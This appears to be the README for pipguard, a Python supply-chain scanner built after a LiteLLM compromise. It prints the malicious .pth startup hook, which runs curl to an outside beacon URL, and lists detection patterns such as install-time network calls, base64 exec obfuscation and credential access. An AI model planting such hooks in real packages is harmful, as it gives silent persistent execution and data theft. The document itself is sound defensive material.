# 🛡️ pipguard

**Stop malicious Python packages before they execute.**

[![CI](https://github.com/allenenli/pipguard/actions/workflows/ci.yml/badge.svg)](https://github.com/allenenli/pipguard/actions)
[![PyPI version](https://badge.fury.io/py/pipguard.svg)](https://badge.fury.io/py/pipguard)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-green.svg)](LICENSE)

---

## What happened

On **March 24, 2026**, [LiteLLM 1.82.7 was published to PyPI](https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign) with a hidden `.pth` file:

```python
# litellm_init.pth — executes on every Python startup
import subprocess, sys
subprocess.Popen(
    ['curl', '-s', 'https://models.litellm.cloud/beacon', '-d', sys.version],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
)
```

This file runs **every time you start Python** — not just during `pip install`. It was downloaded ~95 million times per month. The package was flagged and removed, but not before significant exposure.

pipguard was built to catch this.

---

## Quick demo

```bash
pip install pipguard

# Scan LiteLLM 1.82.7 (the compromised version)
pipguard check litellm 1.82.7
```

```
🔍 pipguard — Analyzing litellm==1.82.7

╭────────────┬──────────────────────────────┬──────────────────────────────────────╮
│ Severity   │ Rule                         │ Title                                │
├────────────┼──────────────────────────────┼──────────────────────────────────────┤
│ CRITICAL   │ PTH_FILE_INSTALL             │ .pth file installs dangerous code... │
│ CRITICAL   │ PTH_NETWORK_BEACON           │ phone-home on every Python startup   │
│ CRITICAL   │ PTH_SUBPROCESS               │ subprocess on every Python startup   │
╰────────────┴──────────────────────────────┴──────────────────────────────────────╯

  Score: 10.0 / 10.0
  Verdict: ██ MALICIOUS

  Rollback: pip install litellm==1.82.6
```

---

## Install

```bash
pip install pipguard
```

Requires Python 3.9+. No Docker. No root. Works on Linux, macOS, Windows.

---

## Usage

### Scan a single package

```bash
pipguard check requests 2.28.0
pipguard check litellm latest
```

### Audit your entire project

```bash
pipguard audit requirements.txt
pipguard audit pyproject.toml
```

Output:
```
🔍 pipguard audit — requirements.txt (42 packages)

Scanning packages... ████████████████████████ 100%

╭──────────────────┬─────────┬───────┬──────────╮
│ Package          │ Version │ Score │ Verdict  │
├──────────────────┼─────────┼───────┼──────────┤
│ litellm          │ 1.82.7  │ 10.0  │ MALICIOUS│
│ suspicious-lib   │ 0.3.1   │  7.5  │ HIGH_RISK│
│ requests         │ 2.28.0  │  0.0  │ SAFE     │
│ ...              │ ...     │  0.0  │ SAFE     │
╰──────────────────┴─────────┴───────┴──────────╯

✗ 2 package(s) failed the audit.
```

### Compare two versions

```bash
pipguard diff litellm 1.82.6 1.82.7
```

```
Version diff: litellm 1.82.6 → 1.82.7

  Added files:  litellm_init.pth   ← NEW .pth file
  Removed:      (none)
  [CRITICAL] New .pth file with network beacon
```

### Safe install

```bash
# Scans before installing, blocks if malicious
pipguard install litellm==1.82.7
```

### Use as a pip drop-in

```bash
alias pip="pipguard install"
```

### JSON output (for pipelines)

```bash
pipguard check litellm 1.82.7 --json-output | jq '.verdict'
# "MALICIOUS"

pipguard audit requirements.txt --json-output \
  | jq '.results[] | select(.verdict != "SAFE")'
```

---

## GitHub Action

Add to any repo to block malicious packages on every push:

```yaml
# .github/workflows/security.yml
name: Supply Chain Security

on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Scan dependencies for supply chain attacks
        uses: allenenli/pipguard@v0.1.0
        with:
          requirements: requirements.txt
          fail-on: MALICIOUS   # or HIGH_RISK for stricter mode
```

That's it. The action will fail your build if any package matches a known attack pattern.

---

## What pipguard detects

### .pth attack (LiteLLM 1.82.7 pattern)

`.pth` files in Python site-packages execute **on every interpreter startup** — not just during install. This makes them ideal for persistent backdoors.

pipguard understands the difference:

| .pth content | Classification | Finding |
|---|---|---|
| Empty | Normal | ✓ silent |
| `/usr/local/lib/...` | Path-only | ✓ silent |
| setuptools distutils shim | Safe code | ⚠ LOW |
| `subprocess.Popen(['curl', ...])` | **Dangerous** | 🔴 CRITICAL |

### Other attack vectors

| What | Where | Severity |
|---|---|---|
| Network call during `pip install` | `setup.py` | HIGH |
| Shell command during `pip install` | `setup.py` | HIGH |
| `exec(base64.decode(...))` obfuscation | anywhere | HIGH |
| Network call on every `import` | `__init__.py` | MEDIUM |
| SSH / AWS credentials access | anywhere | HIGH |
| Path traversal in wheel zip | `.whl` structure | CRITICAL |
| Known malicious SHA256 hash | `.whl` file | CRITICAL |

### What pipguard does NOT do

- Does not install packages
- Does not execute any package code
- Does not require Docker or privileged access
- Does not send package contents to any server
- Does not replace `pip` — it scans before you decide to install

---

## How it works

```
pip install request      ← your intent
      ↓
pipguard                 ← intercepts
      ↓
Download wheel (no install, no execute)
      ↓
Static analysis:
  - Zip safety (path traversal, zip bomb)
  - .pth file semantic classifier
  - AST analysis of setup.py / install hooks
  - Obfuscation detection
  - __init__.py delayed-trigger scan
  - SHA256 hash database
      ↓
Score 0–10 → Verdict: SAFE / LOW_RISK / HIGH_RISK / MALICIOUS
      ↓
Block or proceed
```

No sandboxing, no Docker, no kernel modules. Pure Python static analysis that runs in seconds.

---

## Comparison

| Tool | What it does | .pth detection | No Docker | Lockfile audit | Speed |
|---|---|---|---|---|---|
| **pipguard** | Supply chain scanner | ✅ semantic | ✅ | ✅ | ~2s |
| pip-audit | Known CVEs only | ❌ | ✅ | ✅ | fast |
| Safety | Known CVEs only | ❌ | ✅ | ✅ | fast |
| Trivy | Full SBOM+CVE | ❌ | ✅ | ✅ | slow |
| Bandit | SAST (your code) | ❌ | ✅ | ❌ | fast |

pipguard is not a CVE scanner. It's a behavioral scanner — it looks for what a package *does*, not whether it appears in a database.

---

## Contributing

```bash
git clone https://github.com/allenenli/pipguard
cd pipguard
pip install -e ".[dev]"
pytest tests/
```

PRs welcome, especially:
- New malicious hash signatures
- Detection rules for new attack patterns
- Language ports (Go, Rust) for faster scanning

---

## License

Apache 2.0. See [LICENSE](LICENSE).

---

*Built after [LiteLLM supply chain attack](https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign), March 2026.*
